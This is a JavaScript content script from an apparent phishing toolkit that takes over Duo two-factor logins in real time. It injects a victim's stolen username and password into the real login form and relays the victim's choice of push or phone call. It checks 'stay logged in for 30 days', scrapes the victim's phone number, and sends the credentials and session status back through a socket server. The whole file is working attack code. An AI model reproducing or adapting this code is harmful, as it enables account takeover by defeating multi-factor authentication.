// The following variables are injected at runtime by the bash startup
// script that launches the docker container that runs this extension
//
// var USER; // username of victim
// var PASS; // password of victim
// var SID;  // session ID of victim's socket session


// Submit initial DUO user/pass login form with injected creds
function injectCreds() {
    var usr = document.getElementsByName("j_username")[0];
    var pass = document.getElementsByName("j_password")[0];
    var submitKerb = document.getElementsByName("Submit")[0];
    usr.value = USER
    pass.value = PASS
    submitKerb.click()
}

// Need open DUO iframe in new tab so that we can interact with it
function openDUO() {
    var frame = document.getElementById("duo_iframe");
    window.open(frame.src);
}

// Click on the authentication method in the duo window
function selectAuth(method) {
    var btns = document.getElementsByTagName("button");

    // If window hasns't loaded yet for some reason, retry soon
    if (btns.length == 0) {
        setTimeout(selectAuth(method), 300);
        return;
    }

    // Of course, stay logged in for 30 days
    var checkbox = document.getElementsByName("dampen_choice")[0];
    checkbox.checked = true;

    // Hit the button
    switch (method) {
        case "0": 
            // duo push
            btns[0].click();
            break;
        case "1": 
            // call me
            btns[1].click();
            break;
    }

    // Start checking for authentication succeeded message. 
    setTimeout(function() {checkAuthSucc()}, 500);
}

// This method checks if the authentication has succeeded, and if it
// did, send a message to the socket server that it did. This also
// closes the socket and will shut down this docker container eventually.
function checkAuthSucc() {
    var messages = document.getElementsByClassName("message-text");
    var succ = false;

    for (var i = 0; i < messages.length; i++) {
        var m = messages[i].innerHTML;
        if (m.includes("Success")) {

            // success message found. Send success to background script
            // who will then relay it to socket server who will then 
            // relay it to victim
            window.localStorage.setItem("loggedIn", "true");
            browser.runtime.sendMessage({
                    "status": "loggedIn", 
                    "sid"   : SID,
                    "user"  : USER,
                    "pass"  : PASS
            });
            succ = true;
        }

        // If phone answered message appears, relay that to victim 
        if (m.includes("Answered") && window.callAnswered == undefined) {
            window.callAnswered = true;
            browser.runtime.sendMessage({"status": "callAnswered", "sid":SID});
        }
    }
    
    // If not succeeded, try checking again in a bit
    if (succ == false) {
        setTimeout(function(){checkAuthSucc()}, 500);
    }
}

// Returns true if valid kerb credentials were supplied
function validCreds() {
    return document.body.innerHTML.includes("Duo second-factor authentication");
}

// If the current window is the duo-2 window, e.g. the user's creds were good
if (window.location.href.endsWith("UsernamePassword")) {
    if (validCreds()) {
        openDUO();
        browser.runtime.sendMessage({"status": "validCreds", "sid":SID});
    }
    else {
        browser.runtime.sendMessage({"status": "invalidCreds", "sid":SID});
        browser.runtime.sendMessage({"local": "removeTab"});
    }
}
// If the current window is the isolated duo iframe window
else if (window.location.href.includes("duosecurity.com")) {
    if (window.localStorage.getItem("loggedIn") != "true") {
        // Try get phone number from the duo window HTML and relay it to victim
        var num; 
        try {
            num = document.getElementsByName("device")[0].innerHTML
                    .split("(")[1].substring(0, 12);
        }
        catch(e){}
        if (num != undefined)
            browser.runtime.sendMessage({
                "status": "waitingForAuthm", 
                "number":num, "sid":SID
            });
        else
            browser.runtime.sendMessage({
                "status": "waitingForAuthm", 
                "sid":SID
            });

        // Wait for instruction from the socket server (who relayed victim's
        // instruction)
        browser.runtime.onMessage.addListener(function(msg) {
            if (msg["status"] == "selected") {
                browser.runtime.sendMessage({"status":"authing...", "sid":SID});
                selectAuth(msg.method);
            }
            if (msg["action"] == "cancelPressed") {
                try {
                    document.getElementsByClassName("btn-cancel")[0].click();
                }
                catch(e){}
            }
            // deprecated
            if (msg["action"] == "closeTab") {
                browser.runtime.sendMessage({"local": "removeTab"});
            }
        });
    }
}
// If the current window is the duo-1 window (where user types creds) 
else {
    injectCreds();
    browser.runtime.sendMessage({"action":"requestVictim", "sid":SID});
}
